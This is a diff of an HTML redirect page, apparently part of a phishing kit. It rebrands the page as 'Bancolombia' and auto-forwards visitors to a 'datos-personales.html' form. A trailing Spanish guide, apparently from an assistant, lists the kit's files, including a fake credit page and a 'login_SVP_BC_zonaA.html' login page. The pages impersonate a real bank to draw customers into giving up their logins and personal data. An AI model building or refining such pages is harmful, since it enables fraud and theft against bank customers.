@@ -2,112 +2,81 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redireccionando...</title>
-    
-    <script type="text/javascript">
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
-        
-        // Redirigir según el dispositivo
-        if (isMobile()) {
-            // CAMBIO AQUÍ: usar celindexd741.html
-            window.location.href = "celindexd741.html";
-        } else {
-            // Si es escritorio, va directo al login
-            window.location.href = "indexx.html";
-        }
-    </script>
-    
-    <!-- CAMBIO AQUÍ también -->
-    <meta http-equiv="refresh" content="0; url=celindexd741.html">
-    
+    <title>Redirigiendo - Bancolombia</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
-        
-        .loader-container {
+
+        .loading-container {
             text-align: center;
-            color: white;
+            padding: 20px;
         }
-        
-        .loader {
-            border: 8px solid rgba(255, 255, 255, 0.3);
-            border-top: 8px solid white;
-            border-radius: 50%;
+
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #005CA9;
+            margin-bottom: 30px;
+        }
+
+        .spinner {
             width: 60px;
             height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #FDDA24;
+            border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto 25px;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        h2 {
-            margin: 0;
-            font-size: 24px;
-            font-weight: 300;
+
+        .loading-text {
+            color: #005CA9;
+            font-size: 16px;
+            font-weight: 600;
         }
-        
-        p {
-            margin: 10px 0 0;
+
+        .loading-subtext {
+            color: #666;
             font-size: 14px;
-            opacity: 0.8;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="loader-container">
-        <div class="loader"></div>
-        <h2>Redireccionando...</h2>
-        <p>Por favor espera un momento</p>
+    <div class="loading-container">
+        <div class="logo">Bancolombia</div>
+        <div class="spinner"></div>
+        <p class="loading-text">Redirigiendo a tu solicitud...</p>
+        <p class="loading-subtext">Por favor espera un momento</p>
     </div>
     
-    <noscript>
-        <div style="text-align: center; padding: 20px; background: white; border-radius: 10px; color: #333;">
-            <h3>JavaScript está deshabilitado</h3>
-            <p>Por favor haz clic en el siguiente enlace:</p>
-            <a href="celindexd741.html" style="color: #667eea; font-weight: bold;">Continuar al sitio</a>
-        </div>
-    </noscript>
+    <script>
+        // Redirigir automáticamente después de 1.5 segundos
+        setTimeout(function() {
+            window.location.href = 'datos-personales.html';
+        }, 1500);
+    </script>
 </body>
 </html>
-```
-
-## 📂 **Verifica tu estructura de archivos**
-
-Asegúrate de que tengas estos archivos en tu proyecto:
-```
-tu-proyecto/
-│
-├── index.html (redireccionador)
-├── celindexd741.html (página de crédito)
-├── indexx.html (login principal)
-├── login_SVP_BC_zonaA.html (banner)
-│
-├── images/
-│   ├── cel1.jpg
-│   └── w.png
-│
-├── img/
-│   └── imgPublicidad.png
-│
-├── css/
-│   ├── styles.css
-│   ├── bootstrap.css
-│   └── ...
-│
-└── js/
-    └── ...
